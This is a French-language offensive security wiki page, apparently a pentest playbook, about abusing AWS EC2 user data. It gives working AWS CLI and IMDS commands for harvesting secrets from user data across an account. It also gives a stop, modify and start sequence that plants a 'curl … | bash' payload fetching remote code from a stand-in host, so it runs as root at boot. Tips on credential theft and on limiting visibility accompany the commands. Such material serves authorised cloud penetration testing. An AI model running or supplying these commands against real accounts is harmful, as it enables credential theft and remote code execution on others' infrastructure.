---
order: 1
title: "User data : secrets et exécution de code au démarrage"
description: "Lire les scripts user-data EC2 à la recherche de secrets embarqués, ou définir le user data pour exécuter du code au prochain démarrage."
keywords:
  - user data
  - cloud-init
  - secrets
  - script de démarrage
  - EC2
---

# User data

Le **user data** EC2 est le script que cloud-init exécute au premier démarrage. Il contient régulièrement des credentials en dur, des jetons de bootstrap et des URL internes, et il est lisible à la fois depuis le service de métadonnées de l'instance et via l'API EC2 avec `ec2:DescribeInstanceAttribute`. Si vous pouvez le modifier et forcer un redémarrage, le user data exécute aussi votre code en tant que root au prochain démarrage.

## Lire le user data

```bash
# From the EC2 API
aws ec2 describe-instance-attribute --instance-id <id> --attribute userData \
  --query 'UserData.Value' --output text | base64 -d

# From on the instance, via IMDS
TOKEN=$(curl -sX PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 60')
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/user-data
```

## Écrire le user data pour exécuter du code

Le user data ne peut être modifié que lorsque l'instance est arrêtée, donc ce chemin nécessite `ec2:StopInstances`, `ec2:ModifyInstanceAttribute` et `ec2:StartInstances` :

```bash
aws ec2 stop-instances --instance-ids <id>
printf '#!/bin/bash\ncurl -s https://you.example/x | bash\n' | base64 > ud.b64
aws ec2 modify-instance-attribute --instance-id <id> --user-data file://ud.b64
aws ec2 start-instances --instance-ids <id>
```

## Notes d'exploitation

- Extrayez le user data de chaque instance avec une boucle sur `describe-instances` ; les secrets qui s'y trouvent sont fréquents dans les environnements anciens ou construits à la main.
- Le chemin écriture-puis-redémarrage s'exécute en tant que root et livre aussi le rôle du profil d'instance, il fait donc également office de vol de credentials.
- Arrêter et redémarrer une instance est perturbant et visible ; préférez la lecture à la réécriture lorsque des secrets sont déjà présents.

## Outils

- **AWS CLI** (`describe-instance-attribute`, `modify-instance-attribute`) : lire et écrire le user data.
- **Pacu** (`ec2__download_userdata`) : récupération en masse du user data sur tout le compte.

## Références

- [HackTricks Cloud: EC2 user data](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/index.html)
- [Pacu (Rhino Security Labs)](https://github.com/RhinoSecurityLabs/pacu)
- [Hacking the Cloud: AWS](https://hackingthe.cloud/)
- [Stratus Red Team: AWS techniques](https://stratus-red-team.cloud/attack-techniques/AWS/)
